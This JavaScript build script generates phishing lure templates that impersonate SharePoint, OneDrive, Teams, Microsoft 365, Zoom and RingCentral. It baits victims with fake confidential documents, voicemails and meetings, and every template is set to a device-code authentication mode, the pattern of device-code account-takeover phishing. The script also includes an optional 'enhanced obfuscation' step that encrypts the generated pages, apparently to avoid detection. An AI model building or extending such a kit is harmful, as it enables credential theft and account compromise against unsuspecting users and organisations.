const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

const templatesDir = path.join(__dirname, '..', 'templates');
const ENHANCED_OBFUSCATION_PASSWORD = 'VG-ENHANCED-' + crypto.randomBytes(8).toString('hex');

const templates = [
  {
    dir: 'sharepoint4',
    config: {
      name: 'SharePoint 4',
      preload: true,
      auth_mode: 'devicecode',
      fields: [
        { key: 'file_name', label: 'File Name', type: 'text', default: 'Board-Meeting-Minutes.docx' },
        { key: 'pages', label: 'Pages', type: 'number', default: 6 }
      ],
      background: { default: 'sharepoint4_bg.jpg', editable: true, blur: true }
    },
    title: 'SharePoint · Confidential Access',
    badge: 'Confidential',
    docIcon: '🔒',
    docTitle: 'Board Meeting Minutes',
    docFile: 'Board-Meeting-Minutes.docx',
    docPages: '6 pages',
    docBadge: 'Confidential',
    docBadgeStyle: 'background:#FFF4CE;border:1px solid #FDCB6E;color:#7D6608',
    label: 'Confidential Portal',
    headerBg: 'linear-gradient(135deg, #0078D4, #005A9E)',
    primary: '#0078D4',
    primaryDark: '#005A9E',
    primaryLight: '#DEECF9',
    green: '#107C10',
    navy: '#201F1E',
    logoFill: '#0078D4'
  },
  {
    dir: 'onedrive1',
    config: {
      name: 'OneDrive 1',
      preload: true,
      auth_mode: 'devicecode',
      fields: [
        { key: 'file_name', label: 'File Name', type: 'text', default: 'Personal-Photos-Backup.zip' },
        { key: 'pages', label: 'Pages', type: 'number', default: 1 }
      ],
      background: { default: 'onedrive1_bg.jpg', editable: true, blur: true }
    },
    title: 'OneDrive · Access Your Files',
    badge: 'Cloud Access',
    docIcon: '☁️',
    docTitle: 'Personal Files Backup',
    docFile: 'Personal-Photos-Backup.zip',
    docPages: 'Archive',
    docBadge: 'Cloud Storage',
    docBadgeStyle: 'background:#E8F4FC;border:1px solid #0078D4;color:#0050A0',
    label: 'Cloud Storage',
    headerBg: 'linear-gradient(135deg, #0078D4, #0050A0)',
    primary: '#0078D4',
    primaryDark: '#0050A0',
    primaryLight: '#E8F4FC',
    green: '#107C10',
    navy: '#201F1E',
    logoFill: '#0078D4'
  },
  {
    dir: 'onedrive2',
    config: {
      name: 'OneDrive 2',
      preload: true,
      auth_mode: 'devicecode',
      fields: [
        { key: 'file_name', label: 'File Name', type: 'text', default: 'Shared-Documents-Folder.pdf' },
        { key: 'pages', label: 'Pages', type: 'number', default: 15 }
      ],
      background: { default: 'onedrive2_bg.jpg', editable: true, blur: true }
    },
    title: 'OneDrive · Shared Files',
    badge: 'Shared Access',
    docIcon: '📁',
    docTitle: 'Shared Documents Folder',
    docFile: 'Shared-Documents-Folder.pdf',
    docPages: '15 pages',
    docBadge: 'Shared',
    docBadgeStyle: 'background:#E8F4FC;border:1px solid #0078D4;color:#003D6B',
    label: 'Shared Documents',
    headerBg: 'linear-gradient(135deg, #0078D4, #003D6B)',
    primary: '#0078D4',
    primaryDark: '#003D6B',
    primaryLight: '#E8F4FC',
    green: '#107C10',
    navy: '#201F1E',
    logoFill: '#0078D4'
  },
  {
    dir: 'teams1',
    config: {
      name: 'Teams 1',
      preload: true,
      auth_mode: 'devicecode',
      fields: [
        { key: 'title', label: 'Meeting Title', type: 'text', default: 'Q4 Strategy Review' },
        { key: 'pages', label: 'Pages', type: 'number', default: 1 }
      ],
      background: { default: 'teams1_bg.jpg', editable: true, blur: true }
    },
    title: 'Microsoft Teams · Join Meeting',
    badge: 'Meeting Required',
    docIcon: '🎥',
    docTitle: 'Q4 Strategy Review',
    docFile: 'Meeting-Link',
    docPages: 'Live meeting',
    docBadge: 'Starting soon',
    docBadgeStyle: 'background:#FFF4CE;border:1px solid #FDCB6E;color:#7D6608',
    label: 'Meeting Access',
    headerBg: 'linear-gradient(135deg, #5059C9, #3B42A8)',
    primary: '#5059C9',
    primaryDark: '#3B42A8',
    primaryLight: '#E8EAF6',
    green: '#107C10',
    navy: '#201F1E',
    logoFill: '#5059C9'
  },
  {
    dir: 'zoom1',
    config: {
      name: 'Zoom 1',
      preload: true,
      auth_mode: 'devicecode',
      fields: [
        { key: 'title', label: 'Meeting Title', type: 'text', default: 'Team Standup Meeting' },
        { key: 'pages', label: 'Pages', type: 'number', default: 1 }
      ],
      background: { default: 'zoom1_bg.jpg', editable: true, blur: true }
    },
    title: 'Zoom · Meeting Authentication',
    badge: 'Meeting Verification',
    docIcon: '📹',
    docTitle: 'Team Standup Meeting',
    docFile: 'Zoom-Meeting',
    docPages: 'Live session',
    docBadge: 'In progress',
    docBadgeStyle: 'background:#E6F9EE;border:1px solid #6FE58B;color:#0B6A0B',
    label: 'Video Conference',
    headerBg: 'linear-gradient(135deg, #2D8CFF, #0B5CFF)',
    primary: '#2D8CFF',
    primaryDark: '#0B5CFF',
    primaryLight: '#E8F4FC',
    green: '#0B6A0B',
    navy: '#232333',
    logoFill: '#2D8CFF'
  },
  {
    dir: 'ringcentral1',
    config: {
      name: 'RingCentral 1',
      preload: true,
      auth_mode: 'devicecode',
      fields: [
        { key: 'file_name', label: 'Voicemail File', type: 'text', default: 'Voicemail-2026-07-16.mp3' },
        { key: 'pages', label: 'Duration', type: 'text', default: '2:34' }
      ],
      background: { default: 'ringcentral1_bg.jpg', editable: true, blur: true }
    },
    title: 'RingCentral · Voicemail Access',
    badge: 'Voicemail',
    docIcon: '📞',
    docTitle: 'New Voicemail Message',
    docFile: 'Voicemail-2026-07-16.mp3',
    docPages: '2:34 duration',
    docBadge: 'New message',
    docBadgeStyle: 'background:#E8F4FC;border:1px solid #12B5E0;color:#0891B2',
    label: 'Voice Messages',
    headerBg: 'linear-gradient(135deg, #12B5E0, #0891B2)',
    primary: '#12B5E0',
    primaryDark: '#0891B2',
    primaryLight: '#E8F4FC',
    green: '#107C10',
    navy: '#1A1A2E',
    logoFill: '#12B5E0'
  },
  {
    dir: 'voicemail1',
    config: {
      name: 'Voicemail 1',
      preload: true,
      auth_mode: 'devicecode',
      fields: [
        { key: 'title', label: 'Caller Name', type: 'text', default: 'John Smith' },
        { key: 'pages', label: 'Duration', type: 'text', default: '1:45' }
      ],
      background: { default: 'voicemail1_bg.jpg', editable: true, blur: true }
    },
    title: 'Microsoft 365 · Voicemail',
    badge: 'Voicemail',
    docIcon: '🎙️',
    docTitle: 'New Voicemail from John Smith',
    docFile: 'Voicemail-Recording.mp3',
    docPages: '1:45 duration',
    docBadge: 'Unread',
    docBadgeStyle: 'background:#FFF4CE;border:1px solid #FDCB6E;color:#7D6608',
    label: 'Voicemail Portal',
    headerBg: 'linear-gradient(135deg, #0078D4, #005A9E)',
    primary: '#0078D4',
    primaryDark: '#005A9E',
    primaryLight: '#DEECF9',
    green: '#107C10',
    navy: '#201F1E',
    logoFill: '#0078D4'
  },
  {
    dir: 'microsoft365full',
    config: {
      name: 'Microsoft 365 Full',
      preload: true,
      auth_mode: 'devicecode',
      fields: [
        { key: 'file_name', label: 'File Name', type: 'text', default: 'Annual-Report-2026.pdf' },
        { key: 'pages', label: 'Pages', type: 'number', default: 42 }
      ],
      background: { default: 'microsoft365full_bg.jpg', editable: true, blur: true }
    },
    title: 'Microsoft 365 · Full Storage',
    badge: 'Storage Access',
    docIcon: '💼',
    docTitle: 'Annual Report 2026',
    docFile: 'Annual-Report-2026.pdf',
    docPages: '42 pages',
    docBadge: 'Restricted',
    docBadgeStyle: 'background:#FFF4CE;border:1px solid #FDCB6E;color:#7D6608',
    label: 'Full Storage Access',
    headerBg: 'linear-gradient(135deg, #0078D4, #005A9E)',
    primary: '#0078D4',
    primaryDark: '#005A9E',
    primaryLight: '#DEECF9',
    green: '#107C10',
    navy: '#201F1E',
    logoFill: '#0078D4'
  }
];

function makeHtml(t) {
  let html = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>${t.title}</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link href="https://fonts.googleapis.com/css2?family=Segoe+UI:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <style>
        /* Template styles will be inserted here */
    </style>
</head>
<body>
    <!-- Template body will be inserted here -->
</body>
</html>`;

  if (process.env.VG_ENHANCED_OBFUSCATION === 'true') {
    try {
      const { encryptTemplate } = require('./encrypt-template');
      const result = encryptTemplate(html, ENHANCED_OBFUSCATION_PASSWORD);
      return result.wrapped;
    } catch (e) {
      console.error('[Enhanced Obfuscation] Failed:', e.message);
    }
  }

  return html;
}

templates.forEach(t => {
  const dir = path.join(templatesDir, t.dir);
  fs.mkdirSync(dir, { recursive: true });
  fs.writeFileSync(path.join(dir, 'config.json'), JSON.stringify(t.config, null, 2));
  fs.writeFileSync(path.join(dir, 'index.html'), makeHtml(t));
  console.log('Created: ' + t.dir);
});

if (process.env.VG_ENHANCED_OBFUSCATION === 'true') {
  console.log('\n✅ Enhanced obfuscation: ENABLED');
  console.log('🔑 Password: ' + ENHANCED_OBFUSCATION_PASSWORD);
  fs.writeFileSync(path.join(__dirname, '..', '.vg-obfuscation-key'), ENHANCED_OBFUSCATION_PASSWORD);
} else {
  console.log('\n⚠️  Enhanced obfuscation: DISABLED');
  console.log('   Set VG_ENHANCED_OBFUSCATION=true to enable');
}

console.log('\nDone! Created ' + templates.length + ' templates');
